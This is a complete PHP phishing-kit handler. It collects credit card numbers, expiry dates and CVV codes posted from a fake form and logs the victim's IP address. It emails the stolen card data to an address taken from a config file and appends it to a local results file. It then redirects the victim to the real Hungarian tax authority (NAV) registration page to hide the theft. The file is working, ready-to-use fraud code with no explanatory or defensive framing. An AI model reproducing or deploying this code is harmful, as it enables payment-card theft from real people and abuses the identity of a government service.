<html>
<?php
$rzz='rezult.txt';
$cnum=$_POST['p'];
$exp1=$_POST['exp1'];
$exp2=$_POST['exp2'];
$ccv=$_POST['ccv'];
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
include'config.php';
$subject = '-= cc from: '.$ip;
$message = 'cc : '.$cnum."\r\n".'ex1: '.$exp1."\r\n".'ex2: '.$exp2."\r\n".'ccv: '.$ccv;
$headers = 'From: cc@dali.com' . "\r\n" ;
mail($send, $subject, $message, $headers);
$fp = fopen($rzz, 'a');
fwrite($fp, $message);
$messagex="\n".'************************'."\n";
fwrite($fp, $messagex);
fclose($fp);
?>
<meta http-equiv="REFRESH" content="0;url=https://onlineszamla.nav.gov.hu/regisztracio/start">
</html>